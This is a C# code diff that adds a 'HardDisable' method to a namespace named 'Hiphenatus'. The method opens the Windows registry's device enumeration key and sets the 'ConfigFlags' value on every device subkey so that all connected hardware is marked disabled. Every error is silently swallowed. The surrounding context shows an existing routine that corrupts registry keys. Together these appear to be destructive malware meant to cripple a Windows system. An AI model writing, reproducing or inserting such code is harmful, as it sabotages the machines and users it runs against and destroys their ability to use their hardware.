@@ -93,9 +93,39 @@ namespace Hiphenatus
                     CorruptKey(root, keyname);
                 }
                 catch (Exception)
+                {}
+            }
+        }
+
+        public static void HardDisable()
+        {
+            try
+            {
+                // Disable all connected hardware by disabling their registry entries
+                using (RegistryKey systemKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum", true))
                 {
+                    if (systemKey != null)
+                    {
+                        foreach (string subkeyName in systemKey.GetSubKeyNames())
+                        {
+                            try
+                            {
+                                using (RegistryKey deviceKey = systemKey.OpenSubKey(subkeyName, true))
+                                {
+                                    if (deviceKey != null)
+                                    {
+                                        deviceKey.SetValue("ConfigFlags", 0x1, RegistryValueKind.DWord); // Mark as disabled
+                                    }
+                                }
+                            }
+                            catch (Exception)
+                            {}
+                        }
+                    }
                 }
             }
+            catch (Exception)
+            {}
         }
     }
 }
